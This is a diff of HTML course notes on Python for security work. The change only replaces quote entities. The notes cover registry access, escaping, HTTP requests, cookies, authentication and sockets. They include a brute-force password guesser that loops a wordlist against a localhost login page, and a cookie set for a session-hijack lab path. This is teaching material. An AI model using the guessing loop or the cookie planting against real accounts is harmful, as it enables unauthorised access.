SearchBoxEventArgsProvider, SecondaryAuthFactor, SecureAssessment, SecureBoot, Security and Maintenance, SettingSync, Setup, SharedAccess, SharedDLLs, SharedPC, Shell, Shell Extensions, ShellCompatibility, ShellServiceObjectDelayLoad, SHUTDOWN, SideBySide, SignalManager, SmartGlass, SMDEn, SMI, Spectrum, SpeechGestures, StillImage, StorageSense, Store, StructuredQuery, Syncmgr, SysPrepTapi, SystemProtectedUserData, Tablet PC, Telephony, ThemeManager, Themes, TouchKeyboard, UFH, Uninstall, UpdateHealthTools, UpdatePlatform, URL, UserPictureChange, UserState, Utilman, VFUProvider, WaaSAssessment, WebCheck, WinBio, Windows Block Level Backup, Windows To Go, WindowsAnytimeUpgrade, WindowsBackup, WindowsBackupAndRestore, WindowsUpdate, WindowTabManager, WINEVT, Wordpad, Wosc, WSMAN, WSX, WTDS, XboxGaming, XWiz
 </code></pre>
 <h4 id="keys-path-attribute-prints-the-keys-path"><a class="header" href="#keys-path-attribute-prints-the-keys-path">Keys .path() Attribute prints the Keys Path</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; reghandle = Registry(&quot;SOFTWARE_COPY&quot;)
-&gt;&gt;&gt; akey = reghandle.open(r&quot;Microsoft\Windows NT\CurrentVersion\NetworkList&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; reghandle = Registry("SOFTWARE_COPY")
+&gt;&gt;&gt; akey = reghandle.open(r"Microsoft\Windows NT\CurrentVersion\NetworkList")
 &gt;&gt;&gt; for eachsubkey in akey.subkeys():
 ...     print(eachsubkey.path())
 ...
@@ -1857,28 +2096,28 @@ You should consider upgrading via the 'c:\users\melvi\desktop\sans\scripts\pytho
 
 (sans) C:\Users\melvi\Desktop&gt;python3
 Python 3.7.9 (tags/v3.7.9:13c94747c7, Aug 17 2020, 16:30:00) [MSC v.1900 64 bit (AMD64)] on win32
-Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+Type "help", "copyright", "credits" or "license" for more information.
 &gt;&gt;&gt; import html
-&gt;&gt;&gt; html.escape(&quot;&lt; &gt; \&quot; ' &amp;&quot;)
+&gt;&gt;&gt; html.escape("&lt; &gt; \" ' &amp;")
 '&amp;lt; &amp;gt; &amp;quot; &amp;#x27; &amp;amp;'
-&gt;&gt;&gt; html.unescape(&quot;&amp;lt;&amp;gt; &amp;quot; &amp;apos; %41 &amp;#65;&amp;#66;&quot;)
-'&lt;&gt; &quot; \' %41 AB'
+&gt;&gt;&gt; html.unescape("&amp;lt;&amp;gt; &amp;quot; &amp;apos; %41 &amp;#65;&amp;#66;")
+'&lt;&gt; " \' %41 AB'
 &gt;&gt;&gt; import urllib.parse
-&gt;&gt;&gt; urllib.parse.quote(&quot;&lt; &gt; \&quot; ' &amp; : ? + : /&quot;)
+&gt;&gt;&gt; urllib.parse.quote("&lt; &gt; \" ' &amp; : ? + : /")
 '%3C%20%3E%20%22%20%27%20%26%20%3A%20%3F%20%2B%20%3A%20/'
-&gt;&gt;&gt; urllib.parse.quote(&quot;&lt; &gt; \&quot; ' &amp; : ? + : /&quot;, safe=&quot; &quot;)
+&gt;&gt;&gt; urllib.parse.quote("&lt; &gt; \" ' &amp; : ? + : /", safe=" ")
 '%3C %3E %22 %27 %26 %3A %3F %2B %3A %2F'
-&gt;&gt;&gt; urllib.parse.unquote(&quot;%3C %3E %26 %41 &amp;#65;&quot;)
+&gt;&gt;&gt; urllib.parse.unquote("%3C %3E %26 %41 &amp;#65;")
 '&lt; &gt; &amp; A &amp;#65;'
 </code></pre>
 <h4 id="get-requests-with-urllib"><a class="header" href="#get-requests-with-urllib">GET Requests with urllib</a></h4>
 <pre><code class="language-python"># should always quote your URL with urllib.parse.quote
 (sans) C:\Users\melvi\Desktop&gt;python
 Python 3.7.9 (tags/v3.7.9:13c94747c7, Aug 17 2020, 16:30:00) [MSC v.1900 64 bit (AMD64)] on win32
-Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+Type "help", "copyright", "credits" or "license" for more information.
 &gt;&gt;&gt; import urllib.parse
 &gt;&gt;&gt; import urllib.request
-&gt;&gt;&gt; urldata = urllib.parse.quote(&quot;http://web.com&quot;, safe=&quot;/\\:?=+&quot;)
+&gt;&gt;&gt; urldata = urllib.parse.quote("http://web.com", safe="/\\:?=+")
 &gt;&gt;&gt; webcontent = urllib.request.urlopen(urldata).read()
 # can use read() to read the entire contents of the website into a single string
 # can use readlines() to read the contents into a list of lines
@@ -1887,8 +2126,8 @@ Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;licen
 <pre><code class="language-python">&gt;&gt;&gt; import urllib.parse
 &gt;&gt;&gt; import urllib.request
 &gt;&gt;&gt; url = 'http://httpbin.org/post'
-&gt;&gt;&gt; url = urllib.parse.quote(url, safe=&quot;/\\:?=+&quot;)
-&gt;&gt;&gt; data = {&quot;username&quot;:&quot;mikem&quot;,&quot;password&quot;:&quot;codeforensics&quot;}
+&gt;&gt;&gt; url = urllib.parse.quote(url, safe="/\\:?=+")
+&gt;&gt;&gt; data = {"username":"mikem","password":"codeforensics"}
 &gt;&gt;&gt; data = urllib.parse.urlencode(data).encode()
 &gt;&gt;&gt; content = urllib.request.urlopen(url,data).read()
 </code></pre>
@@ -1905,11 +2144,11 @@ You should consider upgrading via the 'c:\users\melvi\desktop\sans\scripts\pytho
 </code></pre>
 <h4 id="one-request-at-a-time"><a class="header" href="#one-request-at-a-time">One Request at a Time</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import requests
-&gt;&gt;&gt; webdata = requests.get(&quot;http://sans.org&quot;).content
+&gt;&gt;&gt; webdata = requests.get("http://sans.org").content
 &gt;&gt;&gt; webdata[:70]
 b'&lt;!doctype html&gt;\n&lt;html data-n-head-ssr&gt;\n  &lt;head&gt;\n  &lt;script&gt;window.onloa'
-&gt;&gt;&gt; url = &quot;http://127.0.0.1/login.php&quot;
-&gt;&gt;&gt; formdata = {&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:&quot;ninja&quot;}
+&gt;&gt;&gt; url = "http://127.0.0.1/login.php"
+&gt;&gt;&gt; formdata = {"username":"admin", "password":"ninja"}
 &gt;&gt;&gt; webdata = requests.post(url, formdata).text
 &gt;&gt;&gt; webdata[:45]
 b'&lt;!doctype html&gt;\n&lt;html data-n-head-ssr&gt;\n  &lt;hea'
@@ -1917,7 +2156,7 @@ b'&lt;!doctype html&gt;\n&lt;html data-n-head-ssr&gt;\n  &lt;hea'
 # requests for all HTTP verbs
 </code></pre>
 <h4 id="response-objects"><a class="header" href="#response-objects">Response Objects</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; resp = requests.get(&quot;http://isc.sans.edu&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; resp = requests.get("http://isc.sans.edu")
 &gt;&gt;&gt; type(resp)
 &lt;class 'requests.models.Response'&gt;
 &gt;&gt;&gt; dir(resp)
@@ -1925,9 +2164,9 @@ b'&lt;!doctype html&gt;\n&lt;html data-n-head-ssr&gt;\n  &lt;hea'
 &gt;&gt;&gt; resp.status_code, resp.reason
 (200, 'OK')
 &gt;&gt;&gt; resp.headers
-{'Content-Type': 'text/html', 'Transfer-Encoding': 'chunked', 'Connection': 'keep-alive', 'Date': 'Fri, 30 May 2025 21:36:14 GMT', 'Last-Modified': 'Fri, 30 May 2025 21:35:26 GMT', 'Content-Encoding': 'gzip', 'x-amz-server-side-encryption': 'AES256', 'ETag': 'W/&quot;91ed0e509a87f261f0b073308d0f976a&quot;', 'Vary': 'accept-encoding', 'X-Cache': 'Hit from cloudfront', 'Via': '1.1 caaddf8ce46d2bfa1216d6fdd9c0393c.cloudfront.net (CloudFront)', 'X-Amz-Cf-Pop': 'IAD61-P4', 'X-Amz-Cf-Id': '5sOhxc5SVisxuo8PjwMlnvxsOAv1w40nlQkYo4YOQbDCf3E4LhPllQ==', 'Age': '192', 'Set-Cookie': 'visid_incap_2188750=8OZ+Akg8Tcap64w7885vxowlOmgAAAAAQUIPAAAAAAD70WuprZds/8xsHHWbWp6B; expires=Sat, 30 May 2026 06:54:40 GMT; HttpOnly; path=/; Domain=.sans.edu; Secure; SameSite=None, nlbi_2188750_2100128=CRItGe7sMSb+HyBRac18PgAAAABJHW2TVNSZVKpl0j+sOV0m; HttpOnly; path=/; Domain=.sans.edu; Secure; SameSite=None, incap_ses_1349_2188750=UuJeXVQTkADjCzB0sJy4Eo0lOmgAAAAADKeHi3Myq3QTe8I4qAztLw==; path=/; Domain=.sans.edu; Secure; SameSite=None', 'Strict-Transport-Security': 'max-age=31556926; includeSubDomains', 'X-CDN': 'Imperva', 'Server': 'nc -l -p 80', 'X-Do-Not-Hack': '18 U.S.C. Parag 1030', 'X-HeyJason': 'DEV522 rocks', 'Expect-CT': 'max-age=0, report-uri=&quot;https://isc.sans.edu/cspreport.html&quot;', 'X-Content-Type-Options': 'nosniff', 'Permitted-Cross-Domain-Policies': 'none', 'X-Frame-Options': 'SAMEORIGIN', 'X-XSS-Protection': '1; mode=block', 'Referrer-Policy': 'same-origin', 'Content-Security-Policy': &quot;default-src 'self'; script-src https://isc.sans.edu https://www.googletagmanager.com https://www.googleoptimize.com https://www.google-analytics.com https://cdn.jsdelivr.net https://cdn.cookielaw.org https://www.youtube.com https://snap.licdn.com/li.lms-analytics/insight.min.js 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' https://isc.sans.edu https://cdn.cookielaw.org https://px.ads.linkedin.com https://www.linkedin.com/px/li_sync https://www.google-analytics.com https://www.googletagmanager.com https://www.google.com/ads/ga-audiences data:; font-src 'self' https://fonts.gstatic.com data:; connect-src https://geolocation.onetrust.com https://privacyportal-de.onetrust.com https://cdn.cookielaw.org https://www.google-analytics.com https://stats.g.doubleclick.net https://cdn.linkedin.oribi.io 'self'; media-src 'self' https://traffic.libsyn.com https://hwcdn.libsyn.com https://content.libsyn.com https://www.dshield.org ; object-src 'none'; child-src 'self' https://www.sans.org; frame-src 'self' https://www.sans.org https://www.youtube.com https://www.youtube-nocookie.com; worker-src 'none'; frame-ancestors https://isc.sans.edu https://www.dshield.org https://www.sans.org; form-action 'self'; upgrade-insecure-requests; block-all-mixed-content; disown-opener; reflected-xss block; manifest-src 'self' https://isc.sans.edu; referrer origin-when-cross-origin; report-uri https://isc.sans.edu/cspreport.html;&quot;, 'X-Iinfo': '9-17469769-17469784 NNNN CT(1 13 0) RT(1748641165385 132) q(0 0 0 1) r(0 0) U12'}
+{'Content-Type': 'text/html', 'Transfer-Encoding': 'chunked', 'Connection': 'keep-alive', 'Date': 'Fri, 30 May 2025 21:36:14 GMT', 'Last-Modified': 'Fri, 30 May 2025 21:35:26 GMT', 'Content-Encoding': 'gzip', 'x-amz-server-side-encryption': 'AES256', 'ETag': 'W/"91ed0e509a87f261f0b073308d0f976a"', 'Vary': 'accept-encoding', 'X-Cache': 'Hit from cloudfront', 'Via': '1.1 caaddf8ce46d2bfa1216d6fdd9c0393c.cloudfront.net (CloudFront)', 'X-Amz-Cf-Pop': 'IAD61-P4', 'X-Amz-Cf-Id': '5sOhxc5SVisxuo8PjwMlnvxsOAv1w40nlQkYo4YOQbDCf3E4LhPllQ==', 'Age': '192', 'Set-Cookie': 'visid_incap_2188750=8OZ+Akg8Tcap64w7885vxowlOmgAAAAAQUIPAAAAAAD70WuprZds/8xsHHWbWp6B; expires=Sat, 30 May 2026 06:54:40 GMT; HttpOnly; path=/; Domain=.sans.edu; Secure; SameSite=None, nlbi_2188750_2100128=CRItGe7sMSb+HyBRac18PgAAAABJHW2TVNSZVKpl0j+sOV0m; HttpOnly; path=/; Domain=.sans.edu; Secure; SameSite=None, incap_ses_1349_2188750=UuJeXVQTkADjCzB0sJy4Eo0lOmgAAAAADKeHi3Myq3QTe8I4qAztLw==; path=/; Domain=.sans.edu; Secure; SameSite=None', 'Strict-Transport-Security': 'max-age=31556926; includeSubDomains', 'X-CDN': 'Imperva', 'Server': 'nc -l -p 80', 'X-Do-Not-Hack': '18 U.S.C. Parag 1030', 'X-HeyJason': 'DEV522 rocks', 'Expect-CT': 'max-age=0, report-uri="https://isc.sans.edu/cspreport.html"', 'X-Content-Type-Options': 'nosniff', 'Permitted-Cross-Domain-Policies': 'none', 'X-Frame-Options': 'SAMEORIGIN', 'X-XSS-Protection': '1; mode=block', 'Referrer-Policy': 'same-origin', 'Content-Security-Policy': "default-src 'self'; script-src https://isc.sans.edu https://www.googletagmanager.com https://www.googleoptimize.com https://www.google-analytics.com https://cdn.jsdelivr.net https://cdn.cookielaw.org https://www.youtube.com https://snap.licdn.com/li.lms-analytics/insight.min.js 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' https://isc.sans.edu https://cdn.cookielaw.org https://px.ads.linkedin.com https://www.linkedin.com/px/li_sync https://www.google-analytics.com https://www.googletagmanager.com https://www.google.com/ads/ga-audiences data:; font-src 'self' https://fonts.gstatic.com data:; connect-src https://geolocation.onetrust.com https://privacyportal-de.onetrust.com https://cdn.cookielaw.org https://www.google-analytics.com https://stats.g.doubleclick.net https://cdn.linkedin.oribi.io 'self'; media-src 'self' https://traffic.libsyn.com https://hwcdn.libsyn.com https://content.libsyn.com https://www.dshield.org ; object-src 'none'; child-src 'self' https://www.sans.org; frame-src 'self' https://www.sans.org https://www.youtube.com https://www.youtube-nocookie.com; worker-src 'none'; frame-ancestors https://isc.sans.edu https://www.dshield.org https://www.sans.org; form-action 'self'; upgrade-insecure-requests; block-all-mixed-content; disown-opener; reflected-xss block; manifest-src 'self' https://isc.sans.edu; referrer origin-when-cross-origin; report-uri https://isc.sans.edu/cspreport.html;", 'X-Iinfo': '9-17469769-17469784 NNNN CT(1 13 0) RT(1748641165385 132) q(0 0 0 1) r(0 0) U12'}
 &gt;&gt;&gt; resp.content[:70]
-b'&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;SANS.edu Internet Storm Ce'
+b'&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;SANS.edu Internet Storm Ce'
 # all those methods return a response object with access to full details about the webpage's response
 </code></pre>
 <h4 id="multiple-requests-with-sessions"><a class="header" href="#multiple-requests-with-sessions">Multiple Requests with Sessions</a></h4>
@@ -1935,9 +2174,9 @@ b'&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;
 &gt;&gt;&gt; browser = requests.session()
 &gt;&gt;&gt; browser.headers
 {'User-Agent': 'python-requests/2.31.0', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}
-&gt;&gt;&gt; browser.headers[&quot;User-Agent&quot;]
+&gt;&gt;&gt; browser.headers["User-Agent"]
 'python-requests/2.31.0'
-&gt;&gt;&gt; browser.headers[&quot;User-Agent&quot;] = &quot;Mozilla FutureBrowser 145.9&quot;
+&gt;&gt;&gt; browser.headers["User-Agent"] = "Mozilla FutureBrowser 145.9"
 &gt;&gt;&gt; browser.headers
 {'User-Agent': 'Mozilla FutureBrowser 145.9', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}
 # remembers settings and headers like User-Agent and maintains state via cookie
@@ -1945,39 +2184,39 @@ b'&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;
 <h4 id="browser-getpost-requests"><a class="header" href="#browser-getpost-requests">Browser GET/POST Requests</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import requests
 &gt;&gt;&gt; browser = requests.session()
-&gt;&gt;&gt; resp = browser.get(&quot;http://www.bing.com&quot;)
+&gt;&gt;&gt; resp = browser.get("http://www.bing.com")
 &gt;&gt;&gt; resp.content[:60]
 # Make GET requests to retrieve data
-b'&lt;!doctype html&gt;&lt;html lang=&quot;de&quot; dir=&quot;ltr&quot;&gt;&lt;head&gt;&lt;meta name=&quot;t'
-&gt;&gt;&gt; postdata = {&quot;username&quot;:&quot;markb&quot;, &quot;password&quot;:&quot;sec573&quot;}
-&gt;&gt;&gt; resp = browser.post(&quot;http://web.page/login.php&quot;, postdata)
+b'&lt;!doctype html&gt;&lt;html lang="de" dir="ltr"&gt;&lt;head&gt;&lt;meta name="t'
+&gt;&gt;&gt; postdata = {"username":"markb", "password":"sec573"}
+&gt;&gt;&gt; resp = browser.post("http://web.page/login.php", postdata)
 # make POST requests to submit data to forms
 </code></pre>
 <h4 id="a-password-guesser"><a class="header" href="#a-password-guesser">A Password Guesser</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import requests
 &gt;&gt;&gt; browser = requests.session()
-&gt;&gt;&gt; passwords = open(&quot;/usr/share/john/password.lst&quot;, &quot;r&quot;).readlines()
+&gt;&gt;&gt; passwords = open("/usr/share/john/password.lst", "r").readlines()
 &gt;&gt;&gt; for pw in passwords:
-...     postdata = {&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:pw.strip()}
-...     x = browser.post(&quot;http://127.0.0.1/login.php&quot;,postdata)
-...     if not &quot;incorrect&quot; in x.text:
+...     postdata = {"username":"admin", "password":pw.strip()}
+...     x = browser.post("http://127.0.0.1/login.php",postdata)
+...     if not "incorrect" in x.text:
 ...             print(x.text, pw)
 </code></pre>
 <h4 id="getpost-requests-proxies"><a class="header" href="#getpost-requests-proxies">GET/POST Requests Proxies</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; browser = requests.session()
 &gt;&gt;&gt; browser.proxies
 {}
-&gt;&gt;&gt; browser.proxies[&quot;http&quot;] = &quot;http://127.0.0.1:8080&quot;
+&gt;&gt;&gt; browser.proxies["http"] = "http://127.0.0.1:8080"
 &gt;&gt;&gt; browser.proxies
 {'http': 'http://127.0.0.1:8080'}
-&gt;&gt;&gt; del browser.proxies[&quot;http&quot;]
+&gt;&gt;&gt; del browser.proxies["http"]
 &gt;&gt;&gt; browser.proxies
 {}
 </code></pre>
 <h4 id="getpost-requests-cookies"><a class="header" href="#getpost-requests-cookies">GET/POST Requests Cookies</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import requests
 &gt;&gt;&gt; browser = requests.session()
-&gt;&gt;&gt; browser.get(&quot;http://www.bing.com&quot;)
+&gt;&gt;&gt; browser.get("http://www.bing.com")
 &lt;Response [200]&gt;
 &gt;&gt;&gt; type(browser.cookies)
 &lt;class 'requests.cookies.RequestsCookieJar'&gt;
@@ -1987,28 +2226,28 @@ b'&lt;!doctype html&gt;&lt;html lang=&quot;de&quot; dir=&quot;ltr&quot;&gt;&lt;h
 <h4 id="access-cookies-in-the-cookiejar"><a class="header" href="#access-cookies-in-the-cookiejar">Access Cookies in the Cookiejar</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; browser.cookies.keys()
 ['MUID', 'SRCHD', 'SRCHHPGUSR', 'SRCHUID', 'SRCHUSR', '_EDGE_S', '_EDGE_V', '_HPVN', '_SS', 'MUIDB']
-&gt;&gt;&gt; browser.cookies[&quot;MUID&quot;]
+&gt;&gt;&gt; browser.cookies["MUID"]
 '28B80BBF788562A61AD81E4379E76310'
-&gt;&gt;&gt; browser.cookies.set(&quot;MUID&quot;, &quot;newvalue&quot;, domain=&quot;bing.com&quot;, path=&quot;/&quot;)
+&gt;&gt;&gt; browser.cookies.set("MUID", "newvalue", domain="bing.com", path="/")
 Cookie(version=0, name='MUID', value='newvalue', port=None, port_specified=False, domain='bing.com', domain_specified=True, domain_initial_dot=False, path='/', path_specified=True, secure=False, expires=None, discard=True, comment=None, comment_url=None, rest={'HttpOnly': None}, rfc2109=False)
 </code></pre>
 <h4 id="example-full-cookie-access"><a class="header" href="#example-full-cookie-access">Example Full Cookie Access</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; browser.cookies._cookies.keys()
 dict_keys(['.bing.com', 'www.bing.com', 'bing.com'])
-&gt;&gt;&gt; browser.cookies._cookies[&quot;.bing.com&quot;].keys()
+&gt;&gt;&gt; browser.cookies._cookies[".bing.com"].keys()
 dict_keys(['/'])
-&gt;&gt;&gt; browser.cookies._cookies[&quot;.bing.com&quot;][&quot;/&quot;].keys()
+&gt;&gt;&gt; browser.cookies._cookies[".bing.com"]["/"].keys()
 dict_keys(['MUID', '_EDGE_S', '_EDGE_V', 'SRCHD', 'SRCHUID', 'SRCHUSR', 'SRCHHPGUSR', '_SS', '_HPVN'])
-&gt;&gt;&gt; browser.cookies._cookies[&quot;.bing.com&quot;][&quot;/&quot;][&quot;MUID&quot;]
+&gt;&gt;&gt; browser.cookies._cookies[".bing.com"]["/"]["MUID"]
 Cookie(version=0, name='MUID', value='28B80BBF788562A61AD81E4379E76310', port=None, port_specified=False, domain='.bing.com', domain_specified=True, domain_initial_dot=True, path='/', path_specified=True, secure=False, expires=1782338071, discard=False, comment=None, comment_url=None, rest={}, rfc2109=False)
-&gt;&gt;&gt; browser.cookies._cookies[&quot;.bing.com&quot;][&quot;/&quot;][&quot;MUID&quot;].path
+&gt;&gt;&gt; browser.cookies._cookies[".bing.com"]["/"]["MUID"].path
 '/'
-&gt;&gt;&gt; browser.cookies._cookies[&quot;.bing.com&quot;][&quot;/&quot;][&quot;MUID&quot;].secure
+&gt;&gt;&gt; browser.cookies._cookies[".bing.com"]["/"]["MUID"].secure
 False
 </code></pre>
 <h4 id="add-cookies-to-the-cookiejar"><a class="header" href="#add-cookies-to-the-cookiejar">Add Cookies to the Cookiejar</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import http
-&gt;&gt;&gt; newcookie = http.cookiejar.Cookie(version=0, name=&quot;session.id&quot;, value=&quot;sessionid&quot;, port=None, port_specified=False, domain=&quot;10.10.10.30&quot;, domain_specified=True, domain_initial_dot=True, path=&quot;/sessionhijack.php&quot;, path_specified=True, secure=False, expires=None, discard=False, comment=None, comment_url=None, rest={&quot;HttpOnly&quot;:None})
+&gt;&gt;&gt; newcookie = http.cookiejar.Cookie(version=0, name="session.id", value="sessionid", port=None, port_specified=False, domain="10.10.10.30", domain_specified=True, domain_initial_dot=True, path="/sessionhijack.php", path_specified=True, secure=False, expires=None, discard=False, comment=None, comment_url=None, rest={"HttpOnly":None})
 &gt;&gt;&gt; browser.cookies.set_cookie(newcookie)
 </code></pre>
 <h4 id="erase-cookies-in-the-cookiejar"><a class="header" href="#erase-cookies-in-the-cookiejar">Erase Cookies in the Cookiejar</a></h4>
@@ -2016,28 +2255,28 @@ False
 # erases all cookies in cookiejar
 &gt;&gt;&gt; browser.cookies.clear_session_cookies()
 # clears session cookies
-&gt;&gt;&gt; browser.cookies.clear(domain=&quot;www.bing.com&quot;)
+&gt;&gt;&gt; browser.cookies.clear(domain="www.bing.com")
 # clears cookie for specific domain
 &gt;&gt;&gt; browser.cookies.keys()
 []
-&gt;&gt;&gt; del browser.cookies(&quot;MUID&quot;)
+&gt;&gt;&gt; del browser.cookies("MUID")
 # clears cookie based on its name
 </code></pre>
 <h4 id="getpost-request-authentication"><a class="header" href="#getpost-request-authentication">GET/POST Request Authentication</a></h4>
 <pre><code class="language-python"># using auth argument
 &gt;&gt;&gt; import requests
-&gt;&gt;&gt; requests.get(&quot;http://httpbin.org/basic-auth/user/passwd&quot;, auth=(&quot;user&quot;,&quot;passwd&quot;))
+&gt;&gt;&gt; requests.get("http://httpbin.org/basic-auth/user/passwd", auth=("user","passwd"))
 &lt;Response [200]&gt;
-&gt;&gt;&gt; requests.get(&quot;http://httpbin.org/basic-auth/user/passwd&quot;, auth=(&quot;user&quot;,&quot;notPasswd&quot;))
+&gt;&gt;&gt; requests.get("http://httpbin.org/basic-auth/user/passwd", auth=("user","notPasswd"))
 &lt;Response [401]&gt;
 # using auth attribute on browser object
 &gt;&gt;&gt; import requests
 &gt;&gt;&gt; browser = requests.session()
-&gt;&gt;&gt; browser.auth = (&quot;user&quot;, &quot;password&quot;)
-&gt;&gt;&gt; browser.get(&quot;http://httpbin.org/basic-auth/user/password&quot;)
+&gt;&gt;&gt; browser.auth = ("user", "password")
+&gt;&gt;&gt; browser.get("http://httpbin.org/basic-auth/user/password")
 &lt;Response [200]&gt;
-&gt;&gt;&gt; browser.auth = (&quot;user&quot;, &quot;notpassword&quot;)
-&gt;&gt;&gt; browser.get(&quot;http://httpbin.org/basic-auth/user/password&quot;)
+&gt;&gt;&gt; browser.auth = ("user", "notpassword")
+&gt;&gt;&gt; browser.get("http://httpbin.org/basic-auth/user/password")
 &lt;Response [401]&gt;
 </code></pre>
 <h4 id="other-auth-types"><a class="header" href="#other-auth-types">Other Auth Types</a></h4>
@@ -2050,24 +2289,24 @@ False
 <pre><code class="language-python">&gt;&gt;&gt; import requests
 &gt;&gt;&gt; from requests_oauthlib import OAuth1
 &gt;&gt;&gt; browser = requests.session()
-&gt;&gt;&gt; browser.auth = OAuth1(&quot;APP_KEY&quot;,&quot;APP_SECRET&quot;,&quot;USER_TOKEN&quot;, &quot;USER_SECRET&quot;)
-&gt;&gt;&gt; browser.get(&quot;http://api.oauth.site/api&quot;)
+&gt;&gt;&gt; browser.auth = OAuth1("APP_KEY","APP_SECRET","USER_TOKEN", "USER_SECRET")
+&gt;&gt;&gt; browser.get("http://api.oauth.site/api")
 
 ...
 
 &gt;&gt;&gt; from requests_ntlm import HttpNtlmAuth
 &gt;&gt;&gt; browser = requests.session()
-&gt;&gt;&gt; browser.auth = HttpNtlmAuth(r&quot;domain\username&quot;,&quot;password&quot;)
-&gt;&gt;&gt; browser.get(&quot;http://ntlm.site&quot;)
+&gt;&gt;&gt; browser.auth = HttpNtlmAuth(r"domain\username","password")
+&gt;&gt;&gt; browser.get("http://ntlm.site")
 
 ...
 
 &gt;&gt;&gt; from requests_kerberos import HTTPKerberosAuth
 &gt;&gt;&gt; browser.auth = HTTPKerberosAuth()
-&gt;&gt;&gt; browser.get(&quot;http://kerberos-authenticated-site.com&quot;)
+&gt;&gt;&gt; browser.get("http://kerberos-authenticated-site.com")
 </code></pre>
 <h4 id="ssltls-support"><a class="header" href="#ssltls-support">SSL/TLS Support</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; browser.get(&quot;https://site.com&quot;, verify=False)
+<pre><code class="language-python">&gt;&gt;&gt; browser.get("https://site.com", verify=False)
 # to see where your certificates are installed
 &gt;&gt;&gt; import requests
 &gt;&gt;&gt; requests.certs.where()
@@ -2092,10 +2331,10 @@ False
 <h3 id="socket-communications"><a class="header" href="#socket-communications">Socket Communications</a></h3>
 <h4 id="dns-queries"><a class="header" href="#dns-queries">DNS Queries</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import socket
-&gt;&gt;&gt; socket.gethostbyname(&quot;scanme.net&quot;)
+&gt;&gt;&gt; socket.gethostbyname("scanme.net")
 '15.197.148.33'
 # given a hostname, returns an IP
-&gt;&gt;&gt; socket.gethostbyaddr(&quot;3.33.130.190&quot;)
+&gt;&gt;&gt; socket.gethostbyaddr("3.33.130.190")
 ('a2aa9ff50de748dbe.awsglobalaccelerator.com', [], ['3.33.130.190'])
 # given an IP, returns a hostname
 </code></pre>
@@ -2104,9 +2343,9 @@ False
 &gt;&gt;&gt; udpsocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 # AF_INET = IPv4, AF_INET6 = IPv6
 # socket.DGRAM = UDP protocol
-# a server uses bind((&quot;&lt;IP ADDRESS&gt;&quot;, port))
+# a server uses bind(("&lt;IP ADDRESS&gt;", port))
 # client or server receives using udpsocket.recvfrom(&lt;bytes&gt;)
-# client or server sends usind udpsocket.sendto(&lt;bytes&gt;, (&quot;&lt;IP ADDRESS&gt;&quot;, port))
+# client or server sends usind udpsocket.sendto(&lt;bytes&gt;, ("&lt;IP ADDRESS&gt;", port))
 </code></pre>
 <h4 id="tcp-sockets"><a class="header" href="#tcp-sockets">TCP Sockets</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import socket
@@ -2115,16 +2354,16 @@ False
 </code></pre>
 <h4 id="establish-connections"><a class="header" href="#establish-connections">Establish Connections</a></h4>
 <pre><code class="language-python"># create outbound connections
-&gt;&gt;&gt; socket.connect((&quot;&lt;dest ip&gt;&quot;, &lt;dest port&gt;))
+&gt;&gt;&gt; socket.connect(("&lt;dest ip&gt;", &lt;dest port&gt;))
 # accept inbound connections
-&gt;&gt;&gt; socket.bind((&quot;&lt;ip&gt;&quot;, &lt;port&gt;))
+&gt;&gt;&gt; socket.bind(("&lt;ip&gt;", &lt;port&gt;))
 &gt;&gt;&gt; socket.listen(&lt;number of connections&gt;)
 &gt;&gt;&gt; socket.accept()
 </code></pre>
 <h4 id="transmitting-and-receiving"><a class="header" href="#transmitting-and-receiving">Transmitting and Receiving</a></h4>
 <pre><code class="language-python"># to send bytes across the socket
-&gt;&gt;&gt; socket.send(b&quot;bytes to send&quot;)
-&gt;&gt;&gt; socket.send(&quot;string to send&quot;.encode())
+&gt;&gt;&gt; socket.send(b"bytes to send")
+&gt;&gt;&gt; socket.send("string to send".encode())
 # to receive bytes from the socket
 &gt;&gt;&gt; socket.revc(max num of bytes)
 &gt;&gt;&gt; socket.recv(max num of bytes)
@@ -2139,7 +2378,7 @@ False
 <pre><code class="language-python">&gt;&gt;&gt; try:
 ... 	print(500/0)
 ... except:
-... 	print(&quot;An error has occured&quot;)
+... 	print("An error has occured")
 ... 
 An error has occured
 
@@ -2147,31 +2386,31 @@ An error has occured
 
 &gt;&gt;&gt; try:
 ...     print(50/0)
-... 	print(&quot;this line won't execute&quot;)
+... 	print("this line won't execute")
 ... except ZeroDivisionError:
-... 	print(&quot;dude, you can't divide by zero&quot;)
+... 	print("dude, you can't divide by zero")
 ... except Exception as e:
-... 	print(&quot;Some other exception occured &quot; + str(e))
